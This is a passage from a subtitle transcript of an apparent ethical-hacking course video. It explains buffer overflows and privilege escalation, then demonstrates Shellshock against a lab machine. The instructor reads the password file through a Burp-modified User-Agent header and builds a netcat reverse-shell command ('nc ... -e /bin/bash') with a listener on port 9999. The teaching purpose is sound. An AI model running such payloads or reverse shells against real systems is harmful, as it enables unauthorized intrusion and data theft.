00:10:19.580\nThis is in the reverse engineering of\nKali and you can use EDB Debug for Linux.\n\n224\n00:10:20.810 --> 00:10:24.050\nAli Dbg is one for Windows applications.\n\n225\n00:10:24.050 --> 00:10:25.930\nThis is what it'll do.\n\n226\n00:10:25.930 --> 00:10:29.350\nYou can just come in here and\nsay, file, attach, and\n\n227\n00:10:29.350 --> 00:10:34.590\nyou find a process,\nI guess everything's running weird now.\n\n228\n00:10:34.590 --> 00:10:38.073\nBut, let's look for anything interesting.\n\n229\n00:10:38.073 --> 00:10:43.490\nWell, it's not system D how about hello?\n\n230\n00:10:43.490 --> 00:10:44.827\nI'm getting hung up here.\n\n231\n00:10:47.401 --> 00:10:48.800\nThat's fine, we'll do that, just hit okay.\n\n232\n00:10:50.080 --> 00:10:51.210\nI can't debug that process.\n\n233\n00:10:51.210 --> 00:10:54.300\nAnyway, if I fire up a process\nI could attach it and\n\n234\n00:10:54.300 --> 00:10:56.780\nit would show me all those\ninstructions that were happening and\n\n235\n00:10:56.780 --> 00:11:02.080\nthrough this I would be able to see\nwhere I was able to overflow the buffer.\n\n236\n00:11:02.080 --> 00:11:04.790\nI'll be able to look into there and\nfind that, where that happened.\n\n237\n00:11:04.790 --> 00:11:06.850\nOnce I've found out where that space was,\n\n238\n00:11:06.850 --> 00:11:10.070\nI could then push arbitrary\ncode into that space.\n\n239\n00:11:10.070 --> 00:11:14.600\nSo I fill it up with as much\nrandom data as I would need, and\n\n240\n00:11:14.600 --> 00:11:18.480\nthen put code for it to execute right\nafter that into wherever it spilled into.\n\n241\n00:11:18.480 --> 00:11:21.240\nAnd it would fire that off,\nthat's a buffer overflow.\n\n242\n00:11:21.240 --> 00:11:27.240\nSo you're able to basically bypass\nthe boundary of the buffer and\n\n243\n00:11:27.240 --> 00:11:32.430\ngo into somewhere where you would get\nit to actually execute arbitrary code.\n\n244\n00:11:32.430 --> 00:11:33.880\nThat's a buffer overflow.\n\n245\n00:11:33.880 --> 00:11:36.440\nIt's a real high level version of it but\nthat's basically all you need to know.\n\n246\n00:11:36.440 --> 00:11:40.620\nYou don't need to know how to perform\na buffer overflow for the exam.\n\n247\n00:11:40.620 --> 00:11:43.150\n&gt;&gt; Just the example or what it means?\n\n248\n00:11:43.150 --> 00:11:45.330\n&gt;&gt; Just know what that works.\n\n249\n00:11:45.330 --> 00:11:48.490\nAnd the way to mitigate that is for\nthe programmers to check those boundaries.\n\n250\n00:11:48.490 --> 00:11:52.720\nMake sure that if all you can\nhandle is 1,000 characters,\n\n251\n00:11:52.720 --> 00:11:57.930\nthen if they send 1,001, it sees that and\nsay, hey you sent 1,001 characters.\n\n252\n00:11:57.930 --> 00:12:00.290\nThat's an illegal operation.\n\n253\n00:12:00.290 --> 00:12:01.270\nDon't do that.\n\n254\n00:12:01.270 --> 00:12:05.220\nSo that they are checking, it's called\ncheck boundary, or check bounds.\n\n255\n00:12:05.220 --> 00:12:07.350\nThey're checking to make sure that\nyou're not trying to get outside of\n\n256\n00:12:07.350 --> 00:12:07.960\nyour boundaries.\n\n257\n00:12:07.960 --> 00:12:11.190\nOr if it does, accidentally.\n\n258\n00:12:11.190 --> 00:12:14.410\nIt has some sort of control\nmechanism to keep it from occurring.\n\n259\n00:12:14.410 --> 00:12:16.190\nThat's how you would\nkeep it from happening.\n\n260\n00:12:16.190 --> 00:12:18.200\nBut if we don't do that.\n\n261\n00:12:18.200 --> 00:12:22.930\nGuess what, you might be and\nfuzzing is a way to figure this out, but\n\n262\n00:12:22.930 --> 00:12:24.400\nyou might be susceptible\nto buffer overflow.\n\n263\n00:12:25.560 --> 00:12:27.440\nAll right, privilege escalation.\n\n264\n00:12:28.540 --> 00:12:31.370\nSometimes you can use a buffer overflow\nto create a privilege escalation.\n\n265\n00:12:31.370 --> 00:12:33.470\nSometimes these things work\nhand in hand together.\n\n266\n00:12:33.470 --> 00:12:37.310\nBut privilege escalation is a myriad\nof different techniques to figure out\n\n267\n00:12:37.310 --> 00:12:42.310\nhow to go from a standard user\nto an administrative user.\n\n268\n00:12:42.310 --> 00:12:44.720\nOr, jump laterally.\n\n269\n00:12:44.720 --> 00:12:49.060\nBut typically I want,\nI guess privilege escalation.\n\n270\n00:12:49.060 --> 00:12:51.490\nIf you don't have any more privileges,\nit's not an escalation.\n\n271\n00:12:51.490 --> 00:12:53.580\nYou want to jump up, not laterally.\n\n272\n00:12:53.580 --> 00:12:55.480\nA lot of times it looks like\nyou're moving laterally,\n\n273\n00:12:55.480 --> 00:12:59.880\neven though you've only barely\nincreased your privileges.\n\n274\n00:12:59.880 --> 00:13:01.030\nEven if you did jump laterally,\n\n275\n00:13:01.030 --> 00:13:03.530\nyou might have more privileges\nover whatever user you jumped to.\n\n276\n00:13:03.530 --> 00:13:05.650\nYou may now have privileges\nover their things.\n\n277\n00:13:05.650 --> 00:13:07.970\nSo, that could be considered\nprivilege escalation.\n\n278\n00:13:07.970 --> 00:13:10.350\nI've escalated my\nprivileges to their stuff.\n\n279\n00:13:11.370 --> 00:13:12.810\nBut not the overall system at large.\n\n280\n00:13:12.810 --> 00:13:13.539\nBut typically,\n\n281\n00:13:13.539 --> 00:13:16.930\nwe're talking about going from standard\nuser into an administrative user.\n\n282\n00:13:16.930 --> 00:13:17.791\nHow do I do that?\n\n283\n00:13:17.791 --> 00:13:21.367\nThere's tons of privilege escalation\nattacks that you can play with and\n\n284\n00:13:21.367 --> 00:13:22.370\ndownload.\n\n285\n00:13:22.370 --> 00:13:25.685\nIf I do searchsploit, searchsploit.\n\n286\n00:13:25.685 --> 00:13:32.658\nI-T like that, and say,\nWindows server priv esc.\n\n287\n00:13:32.658 --> 00:13:35.790\nAnd this is just a search criteria,\nso I don't have to spell everything.\n\n288\n00:13:35.790 --> 00:13:37.700\nIt's gonna look for\nthe regular expression.\n\n289\n00:13:39.130 --> 00:13:43.030\nAnd there we go, hit Enter, I'm getting,\n\n290\n00:13:43.030 --> 00:13:46.590\nhere's Microsoft Windows Server\n2003 exploits and\n\n291\n00:13:46.590 --> 00:13:50.703\nthis is a privilege escalation exploit.\n\n292\n00:13:50.703 --> 00:13:52.167\nI can download that code,\n\n293\n00:13:52.167 --> 00:13:56.910\nif this applied to whatever server f soft\nI was looking at a Windows server 2003.\n\n294\n00:13:56.910 --> 00:14:00.720\nI've gained some level of access to it but\nnot administrative.\n\n295\n00:14:00.720 --> 00:14:05.500\nI can then download this code, compile\nit and run it against the machine to\n\n296\n00:14:05.500 --> 00:14:09.010\nsee if it would actually\ngive me elevated privileges.\n\n297\n00:14:09.010 --> 00:14:12.679\nWe won't look at it just because\nit's C code and it's not gonna\n\n298\n00:14:12.679 --> 00:14:17.890\nbe like immediately apparent of what's\ngoing on unless you're a C programmer.\n\n299\n00:14:17.890 --> 00:14:20.030\nBut now you know that you\ncan go into searchploit or\n\n300\n00:14:20.030 --> 00:14:23.580\ngo to exploit-db.com and\nlook through there.\n\n301\n00:14:23.580 --> 00:14:25.530\nIt has the same database.\n\n302\n00:14:25.530 --> 00:14:27.265\nOkay so all of these guys,\n\n303\n00:14:27.265 --> 00:14:31.490\nwell basically what it's doing is\nit's finding ways around the system.\n\n304\n00:14:31.490 --> 00:14:36.360\nMaybe it's programmatically a flaw\nthat they're able to exploit and\n\n305\n00:14:36.360 --> 00:14:37.770\njump privileges.\n\n306\n00:14:37.770 --> 00:14:42.814\nOr maybe it's just that somebody has\nmisconfigured some permissions and\n\n307\n00:14:42.814 --> 00:14:45.500\nit allows you to do certain\nthings that they didn't\n\n308\n00:14:45.500 --> 00:14:47.570\nthink about before they\nwere able to do it.\n\n309\n00:14:47.570 --> 00:14:54.340\nA lot of times, you'll see this with I\nset a permission for a job or a script.\n\n310\n00:14:54.340 --> 00:14:56.230\nA script is a great way.\n\n311\n00:14:56.230 --> 00:15:00.689\nI create the script as an administrator\nbut I allow Zach to use it\n\n312\n00:15:00.689 --> 00:15:03.223\nbecause bush right, at best.\n&gt;&gt; [LAUGH]\n\n313\n00:15:03.223 --> 00:15:06.018\n&gt;&gt; You can set these types of permissions\n\n314\n00:15:06.018 --> 00:15:09.597\non scripts where I'm the owner but\nI allow Zach or\n\n315\n00:15:09.597 --> 00:15:12.840\nany other standard user\nto be able to run it.\n\n316\n00:15:12.840 --> 00:15:17.820\nWhen it runs, the use of the sticky bit\nactually elevates the privileges and\n\n317\n00:15:17.820 --> 00:15:21.870\nruns as me because it needs those\nprivileges to actually run.\n\n318\n00:15:21.870 --> 00:15:24.970\nSo if you see that kind of stuff that's\na great spot for privilege escalation.\n\n319\n00:15:24.970 --> 00:15:26.170\nTo be looking for that.\n\n320\n00:15:26.170 --> 00:15:30.140\nBut basically the idea jumping from one\nlevel to the administrative level and\n\n321\n00:15:30.140 --> 00:15:30.910\nthat's what we're going at.\n\n322\n00:15:31.930 --> 00:15:34.260\nAlright Zach I'm looking at\nour clock I have yakked on and\n\n323\n00:15:34.260 --> 00:15:39.360\non like a crazy man about these problems.\n&gt;&gt; Privilege escalation, got that.\n\n324\n00:15:39.360 --> 00:15:43.644\nNow what about arbitrary code execution?\n&gt;&gt; That's a fun one right there Definitely\n\n325\n00:15:43.644 --> 00:15:45.546\nsomething you want to\nbe on the look out for.\n\n326\n00:15:45.546 --> 00:15:49.177\nIt can show itself in a myriad\nof different ways but\n\n327\n00:15:49.177 --> 00:15:53.067\nbasically what we're talking\nabout is a user telling\n\n328\n00:15:53.067 --> 00:15:57.056\na machine hey I know you're\nnot programmed to do this.\n\n329\n00:15:57.056 --> 00:16:02.616\nBut I've found a way to kind of like\nShovel some code I want you to run to you,\n\n330\n00:16:02.616 --> 00:16:07.496\nand when you get that could you\nrun that for me, that'd be great.\n\n331\n00:16:07.496 --> 00:16:08.459\n&gt;&gt; [LAUGH]\n\n332\n00:16:08.459 --> 00:16:10.034\n&gt;&gt; That is basically remote code\n\n333\n00:16:10.034 --> 00:16:10.730\nexecution.\n\n334\n00:16:10.730 --> 00:16:14.425\nWe see this a lot of times with remote\ncode execution where an attacker's on\n\n335\n00:16:14.425 --> 00:16:15.196\na remote area.\n\n336\n00:16:15.196 --> 00:16:19.250\nAnd they obviously, I don't know,\nit could be an internal threat, but\n\n337\n00:16:19.250 --> 00:16:21.384\na lot of times you'll see the remote.\n\n338\n00:16:21.384 --> 00:16:26.108\nI'm outside of the network, I have\nfound a vulnerability that allows me\n\n339\n00:16:26.108 --> 00:16:30.996\nremote code execution where I'm able\nto send the code through some means.\n\n340\n00:16:30.996 --> 00:16:33.784\nWhatever connection I've\nmade through to you,\n\n341\n00:16:33.784 --> 00:16:38.551\ntypically through the web in some way,\nmaybe another service that's networked.\n\n342\n00:16:38.551 --> 00:16:42.388\nGive it some code, and\nhave it go, I see code here,\n\n343\n00:16:42.388 --> 00:16:46.660\nI'm going to execute that code,\nthat's what I want it to do.\n\n344\n00:16:46.660 --> 00:16:50.690\nAnd one of the great examples\nof this would be Shellshock,\n\n345\n00:16:50.690 --> 00:16:54.734\nvery cool stuff, this was a big deal for\nquite a long time.\n\n346\n00:16:54.734 --> 00:16:59.237\nI think it came out in about 2014, or\nat least it was known around 2014.\n\n347\n00:16:59.237 --> 00:17:02.602\nI could look at the CD, which is\nright in front of me, it says 2014,\n\n348\n00:17:02.602 --> 00:17:03.734\n[LAUGH] it was 2014.\n\n349\n00:17:03.734 --> 00:17:08.674\nBut his was actually around, it was\nbuilt into the Linux system to actually,\n\n350\n00:17:08.674 --> 00:17:09.746\nthe bash shell.\n\n351\n00:17:09.746 --> 00:17:12.455\nThis was a problem with the bash shell,\nbut\n\n352\n00:17:12.455 --> 00:17:16.153\nit wasn't' discovered by\nresearchers until 2014.\n\n353\n00:17:16.153 --> 00:17:17.665\nBut the bash shell's been around for\na long time.\n\n354\n00:17:17.665 --> 00:17:18.182\n&gt;&gt; Goodness.\n\n355\n00:17:18.182 --> 00:17:19.972\n&gt;&gt; Which is why it was such a devastating\n\n356\n00:17:19.972 --> 00:17:23.225\nhit to the community, they were\nimmediately able to create a fix.\n\n357\n00:17:23.225 --> 00:17:28.082\nBut how long was that a zero day\nexploit to threat actors out there that\n\n358\n00:17:28.082 --> 00:17:31.349\nhad learned about this and\nfigured this out and\n\n359\n00:17:31.349 --> 00:17:36.066\nwere using it to access Linux servers for\nyears and using it as APT?\n\n360\n00:17:36.066 --> 00:17:39.639\nThat's crazy., and it was super,\nsuper devastating.\n\n361\n00:17:39.639 --> 00:17:42.082\nSo you gotta look out for that, so\n\n362\n00:17:42.082 --> 00:17:46.812\nall I'm gonna do is I'm actually\ngonna show you how that looks.\n\n363\n00:17:46.812 --> 00:17:48.714\nWhat does that look like?\n\n364\n00:17:48.714 --> 00:17:51.450\nHow do I execute remote code on machine?\n\n365\n00:17:51.450 --> 00:17:54.562\nLet's look at the problem,\ncheck to the computer here.\n\n366\n00:17:54.562 --> 00:18:01.942\nAnd I brought up the CVE for\nShellshock, which is CVE 2014-6271.\n\n367\n00:18:01.942 --> 00:18:06.617\nAnd you've got all these different\nexploits available from Exploit-DB\n\n368\n00:18:06.617 --> 00:18:07.903\nthat you could use.\n\n369\n00:18:07.903 --> 00:18:15.279\nWe've got many papers that address this\nvulnerability that you can look at.\n\n370\n00:18:15.279 --> 00:18:19.511\nYou know what though, I found a lot of\nreally good information on Wikipedia,\n\n371\n00:18:19.511 --> 00:18:20.825\njust ran to Wikipedia.\n\n372\n00:18:20.825 --> 00:18:24.527\nAnd here's our initial report,\nhere's the problem.\n\n373\n00:18:24.527 --> 00:18:29.593\nRight here is, if you're able to send this\n\n374\n00:18:29.593 --> 00:18:34.378\nstring to a server that is running Bash,\n\n375\n00:18:34.378 --> 00:18:39.463\nit will interpret that and give you shell.\n\n376\n00:18:39.463 --> 00:18:43.792\nIt will execute this and\ngive you shell, which is es no bueno.\n\n377\n00:18:43.792 --> 00:18:44.504\n&gt;&gt; No.\n\n378\n00:18:44.504 --> 00:18:46.467\n&gt;&gt; Right, that's bad.\n\n379\n00:18:46.467 --> 00:18:50.786\nSo I'm able to take that piece of code and\nsend it to a server remotely,\n\n380\n00:18:50.786 --> 00:18:53.363\nthis will give me remote code execution.\n\n381\n00:18:53.363 --> 00:18:57.333\nBecause as soon as the server sees that\nit will interpret it as Bash code and\n\n382\n00:18:57.333 --> 00:19:00.996\nexecute it, if I'm vulnerable\nto the Shellshock problem, okay.\n\n383\n00:19:00.996 --> 00:19:02.524\n&gt;&gt; Mm-hm.\n\n384\n00:19:02.524 --> 00:19:03.372\n&gt;&gt; So that's what we're gonna do.\n\n385\n00:19:03.372 --> 00:19:05.540\nWe're actually gonna run this down and\n\n386\n00:19:05.540 --> 00:19:08.109\nshow you how that works out in reality,\nokay.\n\n387\n00:19:08.109 --> 00:19:12.250\nSo when I come over to my machine,\nI'm gonna clear this out, and let's see,\n\n388\n00:19:12.250 --> 00:19:15.267\nthe first thing I'm gonna do,\nis I'm gonna run a scan.\n\n389\n00:19:15.267 --> 00:19:16.863\nBut I'm not gonna run Open Bots,\n\n390\n00:19:16.863 --> 00:19:19.724\nI'm gonna run a web vulnerability\nscanner called Nick2.\n\n391\n00:19:19.724 --> 00:19:24.683\nI'm gonna say Nick2,\nwell I guess I would do an nmap\n\n392\n00:19:24.683 --> 00:19:28.197\nscan first, of do dash n dash p 80.\n\n393\n00:19:28.197 --> 00:19:30.147\nMake sure the server is\nactually running and\n\n394\n00:19:30.147 --> 00:19:33.672\nI would say 192.168.55.145\nwhich is our metasploitable.\n\n395\n00:19:33.672 --> 00:19:38.948\nI'm sorry it's not metasploitable,\nI'm not using that one.\n\n396\n00:19:38.948 --> 00:19:43.882\nI actually have downloaded\na Shellshock-vulnerable machine,\n\n397\n00:19:43.882 --> 00:19:47.387\nright here from PenTester Lab\nout of VulnHub.\n\n398\n00:19:47.387 --> 00:19:50.886\nThere we go, and I can do ifconfig, and\n\n399\n00:19:50.886 --> 00:19:55.989\nI'm running at 197, all right,\nso get out of there.\n\n400\n00:19:55.989 --> 00:19:58.538\nJust to make the easy, and\neasier process, it can do this.\n\n401\n00:19:58.538 --> 00:20:02.243\nSo this is 197, this machine, hit return.\n\n402\n00:20:02.243 --> 00:20:08.369\nI notice that http service is running and\nopen, good to go, that's excellent.\n\n403\n00:20:08.369 --> 00:20:11.833\nAnd now, I want to check that for\nthe vulnerability.\n\n404\n00:20:11.833 --> 00:20:18.546\nSo I'll say nikto -h http:// and\nthen the IP address,\n\n405\n00:20:18.546 --> 00:20:24.437\n1, was it 97, there we go,\nand fire Nikto off.\n\n406\n00:20:24.437 --> 00:20:27.120\nThere goes Nikto,\nit's finding all sorts of things.\n\n407\n00:20:27.120 --> 00:20:32.322\nOne that happens to be, that's kinda,\nmaybe, you'll notice, if you can get\n\n408\n00:20:32.322 --> 00:20:35.514\nbehind my head, I'm sure it's over here.\n&gt;&gt; [LAUGH]\n\n409\n00:20:35.514 --> 00:20:36.790\n&gt;&gt; You'll notice it says,\n\n410\n00:20:36.790 --> 00:20:39.898\nsite appears vulnerable to\nthe shellshock vulnerability.\n\n411\n00:20:39.898 --> 00:20:40.868\n&gt;&gt; It's right there.\n\n412\n00:20:40.868 --> 00:20:41.680\n&gt;&gt; All right, so\n\n413\n00:20:41.680 --> 00:20:45.474\nour scanner has told us that there\nmight be a Shellshock issue built\n\n414\n00:20:45.474 --> 00:20:46.569\ninto this device.\n\n415\n00:20:46.569 --> 00:20:52.130\nSo now we can manually try\nto exploit that, okay.\n\n416\n00:20:52.130 --> 00:20:54.254\nWe could use a metasploit if we wanted to,\n\n417\n00:20:54.254 --> 00:20:57.245\nI'm sure there's a Shellshock\nbuilt in plugin for that.\n\n418\n00:20:57.245 --> 00:20:59.343\nBut that's the easy way to do stuff.\n\n419\n00:20:59.343 --> 00:21:04.215\nLet's see what might happen in a real\nworld scenario if I didn't have\n\n420\n00:21:04.215 --> 00:21:05.314\nthat exploit.\n\n421\n00:21:05.314 --> 00:21:09.423\nSo what I will do is I will\ngo to the page, there we go.\n\n422\n00:21:09.423 --> 00:21:13.218\nHere's the opening page from there and\nI can just with answer and\n\n423\n00:21:13.218 --> 00:21:17.162\nthere it all tells you,\ngives me some uptime when users logged in.\n\n424\n00:21:17.162 --> 00:21:19.991\nAnd tells me this is the CVE\nof the vulnerability\n\n425\n00:21:19.991 --> 00:21:23.261\nletting me know that this is\nwhat this is intended for.\n\n426\n00:21:23.261 --> 00:21:27.336\nIt's really cool if you want it you\ncan download this from Vuln Hub.\n\n427\n00:21:27.336 --> 00:21:29.955\nAnd Pin Tester Lab is\na great resource as well for\n\n428\n00:21:29.955 --> 00:21:32.589\nlearning more about\nthe attack side of things.\n\n429\n00:21:32.589 --> 00:21:35.102\nAll right, so what did my scan tell me?\n\n430\n00:21:35.102 --> 00:21:37.474\nLet's go back to the scan,\n\n431\n00:21:37.474 --> 00:21:42.953\nthe scan told me that it was\nin cgi-bin/status, right thee.\n\n432\n00:21:42.953 --> 00:21:48.990\nSo that is the web directory that might\ncontain the vulnerability that we have,\n\n433\n00:21:48.990 --> 00:21:49.541\nokay.\n\n434\n00:21:49.541 --> 00:21:53.708\nSo I'll go back to our web browser and\n\n435\n00:21:53.708 --> 00:21:58.684\nI'm going to type in /cgi-bin/status,\n\n436\n00:21:58.684 --> 00:22:02.050\nlet's put that, this stat.\n\n437\n00:22:02.050 --> 00:22:06.980\nStatus and\nfix that craziness that I've done here.\n\n438\n00:22:06.980 --> 00:22:10.009\nThere we go, CGI bin slash desk hit Enter.\n\n439\n00:22:10.009 --> 00:22:13.666\nAgain, I'm getting uptime users gives\nus some information about the machine,\n\n440\n00:22:13.666 --> 00:22:14.803\nthat's what I've got.\n\n441\n00:22:14.803 --> 00:22:19.426\nBut what you didn't see me do is I\nfired up Birksweet in the background.\n\n442\n00:22:19.426 --> 00:22:22.758\nI have my web browser is actually\nconnected to Birksweet through\n\n443\n00:22:22.758 --> 00:22:23.694\na proxy, right.\n\n444\n00:22:23.694 --> 00:22:27.475\nSo I do that, just go in here,\nor hit the thing,\n\n445\n00:22:27.475 --> 00:22:32.688\nwhatever your preferences are for\nyour version of your browser.\n\n446\n00:22:32.688 --> 00:22:36.121\nFind the area for network connectivity,\nits settings, and\n\n447\n00:22:36.121 --> 00:22:40.778\nthen make sure that you have proxy\nconfigured for the localhost on port 8080.\n\n448\n00:22:40.778 --> 00:22:43.710\nAnd then everything will\nflow through Birksweet.\n\n449\n00:22:43.710 --> 00:22:48.698\nYou use other tools, open will do this.\n\n450\n00:22:48.698 --> 00:22:52.024\nI have one built into my\nbrowser called Tampered Data.\n\n451\n00:22:52.024 --> 00:22:55.874\nI can see it here if I go into tools,\nI have Tampered Data.\n\n452\n00:22:55.874 --> 00:22:59.091\nAnd I can just hit start tamper and\nany time I click a link or\n\n453\n00:22:59.091 --> 00:23:03.734\ntry to go somewhere in the web, it will\nfirst get intercepted into Tampered Data.\n\n454\n00:23:03.734 --> 00:23:06.303\nIt will first get intercepted\ninto the losses app, or\n\n455\n00:23:06.303 --> 00:23:08.596\nit will get first\nintercepted into Bird Suite.\n\n456\n00:23:08.596 --> 00:23:13.424\nBird Suite, as we talked about before,\nis probably the most commonly used one,\n\n457\n00:23:13.424 --> 00:23:16.200\nbut Tampered Data is\na really easy way to do it.\n\n458\n00:23:16.200 --> 00:23:20.591\nI like it a lot, so if you wanna use that,\nit's fine, but I'm gonna use Burp.\n\n459\n00:23:20.591 --> 00:23:25.327\nAnd all I did was start Burp,\nBurp was started, it's going,\n\n460\n00:23:25.327 --> 00:23:28.618\nand I turned the intercept off right here.\n\n461\n00:23:28.618 --> 00:23:32.804\nSo all I did was click the Burp icon, and\nsaid, yes, I want a new Burp session, and\n\n462\n00:23:32.804 --> 00:23:34.343\nthen clicked Intercept Off.\n\n463\n00:23:34.343 --> 00:23:36.917\nThat's all I've done at this point here.\n\n464\n00:23:36.917 --> 00:23:39.862\nI want the intercept off cuz I didn't\nwanna grabbing the traffic, initially.\n\n465\n00:23:39.862 --> 00:23:42.656\nI just wanna look at\nthis HTTP history area,\n\n466\n00:23:42.656 --> 00:23:46.598\nwhich just makes it a little easier for\nme to work with and see.\n\n467\n00:23:46.598 --> 00:23:50.859\nSo if I click on that,\nyou'll see, here was the request.\n\n468\n00:23:50.859 --> 00:23:57.313\nAnd what's cool is you can, in this User\nAgent area, it's actually interpreting.\n\n469\n00:23:57.313 --> 00:23:58.073\nSome things.\n\n470\n00:23:58.073 --> 00:24:04.100\nAnd in that field I can change it from\nbeing Mozilla Firefox right here.\n\n471\n00:24:06.560 --> 00:24:11.040\nI can change this to be\narbitrary remote code.\n\n472\n00:24:12.290 --> 00:24:14.040\nHm, cuz it's interpreting that.\n\n473\n00:24:14.040 --> 00:24:18.806\nBased off of what's happening there that's\ngetting interpreted back on the web\n\n474\n00:24:18.806 --> 00:24:22.392\nserver to go,\nyou're running Mozilla 5.0 X11 Linux.\n\n475\n00:24:22.392 --> 00:24:26.124\nOkay, great, Fire Fox 52.0.\n\n476\n00:24:26.124 --> 00:24:28.750\nThat means I'm going to deliver\nmy web page in this way.\n\n477\n00:24:28.750 --> 00:24:33.110\nSo there's a program behind the scenes\nthat's taking that information\n\n478\n00:24:33.110 --> 00:24:35.060\nInterpreting it through a program,\n\n479\n00:24:35.060 --> 00:24:37.350\nevaluating most likely in some way,\nshape, or form.\n\n480\n00:24:37.350 --> 00:24:41.340\nRemember eval equals evil [LAUGH]\nall right cuz that happens a lot.\n\n481\n00:24:41.340 --> 00:24:41.980\n&gt;&gt; Evil Corp.\n\n482\n00:24:41.980 --> 00:24:45.020\n&gt;&gt; Yes and therefore so\n\n483\n00:24:45.020 --> 00:24:48.470\nthis is a great spot for\nme to inject my arbitrary code.\n\n484\n00:24:48.470 --> 00:24:53.900\nSo what I'm gonna do is I'm gonna just\nright click here and say send to repeater.\n\n485\n00:24:53.900 --> 00:24:56.730\nThat way it can repeat the request\nas many times as I like,\n\n486\n00:24:56.730 --> 00:24:58.110\nmaking modifications as I go.\n\n487\n00:24:59.130 --> 00:25:04.450\nI'll scroll out and, just in case\nyou didn't see this right here,\n\n488\n00:25:04.450 --> 00:25:07.940\nI kinda got a little jiminy click-it,\nup here in the HTTP history,\n\n489\n00:25:07.940 --> 00:25:12.740\nthis is just everything that\nBURP has seen go through it.\n\n490\n00:25:12.740 --> 00:25:17.373\nSo every sec, I typed in a URL and I hit\nenter, burp said you went to this page.\n\n491\n00:25:17.373 --> 00:25:21.520\nLet me make a record of what the request\nwas and what the response was.\n\n492\n00:25:21.520 --> 00:25:23.330\nThat's all that's happening,\nit's acting as a proxy.\n\n493\n00:25:25.020 --> 00:25:30.010\nSo now I should be able to go to\nthe repeater tab which is right here,\n\n494\n00:25:30.010 --> 00:25:35.630\nat the top the repeater,\neven though this, there's the request.\n\n495\n00:25:35.630 --> 00:25:39.260\nSame thing we just saw\nin the HP history here.\n\n496\n00:25:39.260 --> 00:25:40.970\nSo now what I go do is come in here.\n\n497\n00:25:40.970 --> 00:25:44.250\nI can make,\nyou notice I am in the raw tab.\n\n498\n00:25:44.250 --> 00:25:48.780\nI can erase the lead ad and\nmodify however I want\n\n499\n00:25:48.780 --> 00:25:51.910\nright here from this part of the console\nso I'm just going to wipe this out.\n\n500\n00:25:53.600 --> 00:25:54.190\nSay nope.\n\n501\n00:25:54.190 --> 00:25:55.750\nSee, it's gone.\nHow about that.\n\n502\n00:25:55.750 --> 00:26:00.150\nI can type in hi there,\nif I want, and send that.\n\n503\n00:26:00.150 --> 00:26:02.702\nIt would probably freak things out, but\nhey, that's what we're doing, right?\n\n504\n00:26:02.702 --> 00:26:03.333\n&gt;&gt; [LAUGH]\n\n505\n00:26:03.333 --> 00:26:04.143\n&gt;&gt; We're hackers,\n\n506\n00:26:04.143 --> 00:26:05.979\nwe like to freak things out, it's fun.\n\n507\n00:26:05.979 --> 00:26:09.050\nBut what I want to do is\nexecute arbitrary code.\n\n508\n00:26:09.050 --> 00:26:12.810\nSo I am going to send\nthe attack ring here.\n\n509\n00:26:12.810 --> 00:26:15.060\nI've got it written down\nbecause I haven't memorized it.\n\n510\n00:26:16.060 --> 00:26:17.860\nSo I will do, no.\n\n511\n00:26:17.860 --> 00:26:19.210\nThere we go.\nGotta hit the shift key.\n\n512\n00:26:19.210 --> 00:26:20.432\nIt helps when you do that.\n\n513\n00:26:20.432 --> 00:26:25.163\nAnd we'll send that,\nI'm going to say, here we go,\n\n514\n00:26:25.163 --> 00:26:28.120\nand colon semicolon semicolon.\n\n515\n00:26:29.250 --> 00:26:32.881\nI think that's a string,\nyeah, and then hit that.\n\n516\n00:26:32.881 --> 00:26:39.237\nAnd then I'm just\n\n517\n00:26:39.237 --> 00:26:44.322\ngonna say echo\n\n518\n00:26:44.322 --> 00:26:50.678\n$( The contents\n\n519\n00:26:50.678 --> 00:26:55.770\nof that file.\n\n520\n00:26:56.890 --> 00:27:01.810\nSo let's scroll out, well actually\nI'll hit go so you'll go right here.\n\n521\n00:27:01.810 --> 00:27:04.940\nAnd now if I move over\nto the response side,\n\n522\n00:27:07.120 --> 00:27:10.590\nyou should be seeing something\nvery bad at this point.\n\n523\n00:27:10.590 --> 00:27:15.084\nHopefully this is jumping out at you,\n\n524\n00:27:15.084 --> 00:27:19.870\nthis portion is password file.\n\n525\n00:27:19.870 --> 00:27:24.697\nSo I have read the password\nfile on the remote machine.\n\n526\n00:27:24.697 --> 00:27:28.740\nI have executed remote code, okay?\n\n527\n00:27:28.740 --> 00:27:30.289\nThis is what this looks like.\n\n528\n00:27:30.289 --> 00:27:33.645\nFrom now, I should be able to\ndo all sorts of fun stuff.\n\n529\n00:27:33.645 --> 00:27:35.381\n&gt;&gt; [LAUGH]\n\n530\n00:27:35.381 --> 00:27:37.326\n&gt;&gt; Let's scroll out of here I should\n\n531\n00:27:37.326 --> 00:27:38.720\nbe able to change this.\n\n532\n00:27:38.720 --> 00:27:40.779\nLet's get back in on\nthis side of the world.\n\n533\n00:27:42.813 --> 00:27:47.694\nLet's change this to, instead of echo.\n\n534\n00:27:47.694 --> 00:27:50.984\nWhat if we ran, I don't know,\n\n535\n00:27:50.984 --> 00:27:57.823\nhow about usr/bin/nc -nv 192.168.55.196,\n\n536\n00:27:57.823 --> 00:28:02.138\nI believe I'm following in that today.\n\n537\n00:28:02.138 --> 00:28:06.396\nAnd then -e /bin/bash.\n\n538\n00:28:06.396 --> 00:28:07.979\nWhat if I ran that?\n\n539\n00:28:07.979 --> 00:28:13.383\nAnd at the same time,\nI can go to my workspace here,\n\n540\n00:28:13.383 --> 00:28:17.154\nlet me clear this And I say netcat and\n\n541\n00:28:17.154 --> 00:28:22.460\nI start a listener, and\nNVLP 9999 like that.\n\n542\n00:28:24.020 --> 00:28:26.040\nWe start the listener so\nnow I'm waiting for\n\n543\n00:28:26.040 --> 00:28:29.450\nTCP connections on my machine,\nthis is my machine.\n\n544\n00:28:29.450 --> 00:28:34.120\nWhat happens let's see here, and\nwe noticed that we were root@kali,\n\n545\n00:28:34.120 --> 00:28:35.820\nwe're not listening.\n\n546\n00:28:35.820 --> 00:28:39.351\nGo to,\nI just wanna use the three finger swipe.\n\n547\n00:28:39.351 --> 00:28:40.889\nGo to Workspace 3.\n\n548\n00:28:40.889 --> 00:28:45.570\nWant to make sure that we did not\nadd my port number, that helps.\n\n549\n00:28:45.570 --> 00:28:47.150\nZoom in there so you can see that.\n\n550\n00:28:49.390 --> 00:28:50.870\nThere we go.\n\n551\n00:28:50.870 --> 00:28:55.130\nSo now I'm going to use\nthis command execution.\n\n552\n00:28:55.130 --> 00:28:59.930\nYou'll notice this little semicolon\nto the right of the curly brace.\n\n553\n00:28:59.930 --> 00:29:03.036\nThat is saying,\nfrom this command and then.\n\n554\n00:29:03.036 --> 